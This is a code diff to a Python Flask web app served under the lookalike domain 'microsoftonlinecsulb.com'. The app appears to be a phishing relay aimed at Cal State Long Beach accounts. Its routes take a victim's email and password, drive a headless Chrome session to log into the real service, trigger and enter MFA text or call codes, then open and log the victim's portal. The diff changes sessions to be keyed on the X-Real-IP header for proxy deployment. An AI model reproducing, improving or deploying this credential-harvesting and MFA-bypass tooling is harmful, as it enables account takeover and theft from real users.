@@ -38,7 +38,7 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 
 
 connections = {}
-connections[request.remote_addr] =  main.startChrome()
+connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)] =  main.startChrome()
 
 # chrome = main.startChrome()
 
@@ -106,7 +106,7 @@ def requestCode():
     print("request code py")
     try:
         # print(type(chrome))
-        connections[request.remote_addr].request_text()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].request_text()
         return "True"
     except Exception as E:
         print("text requestCode.text error")
@@ -126,18 +126,18 @@ def text():
     # yield "True"
     try:
         # yield render_template('index.html')
-        connections[request.remote_addr].enterCode(code)
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].enterCode(code)
     except:
         print("text chrome.text error")
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
     time.sleep(20)
     try:
-        connections[request.remote_addr].open_mycsulb()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].open_mycsulb()
     except:
         print("text chrome_opensulb error")
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
 
-    connections[request.remote_addr].log_info()
+    connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].log_info()
 
 
     return render_template('index.html')
@@ -148,21 +148,21 @@ def call():
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
     try:
-        connections[request.remote_addr].call()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].call()
     except:
         print("call chrome.call error")
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
     time.sleep(30)
     try:
-        connections[request.remote_addr].open_mycsulb()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].open_mycsulb()
     except:
         print("call open_mycsulb() error")
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
     try:
-        connections[request.remote_addr].log_info()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].log_info()
     except:
         print("call log_info() error")
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
 
     return render_template('index.html')
         
@@ -175,7 +175,7 @@ def login():
     password = request.form.get('password')
     # print(email,password)
     try:
-        var = connections[request.remote_addr].login_email(email,password)
+        var = connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].login_email(email,password)
         if var == True:
         #stop loading
         
@@ -186,7 +186,7 @@ def login():
             # os.system('chmod 777 '+email+'.txt')
     except Exception as e:
         print("get var error",e)
-        connections[request.remote_addr].restart()
+        connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)  ].restart()
     return render_template('index.html')
     
         
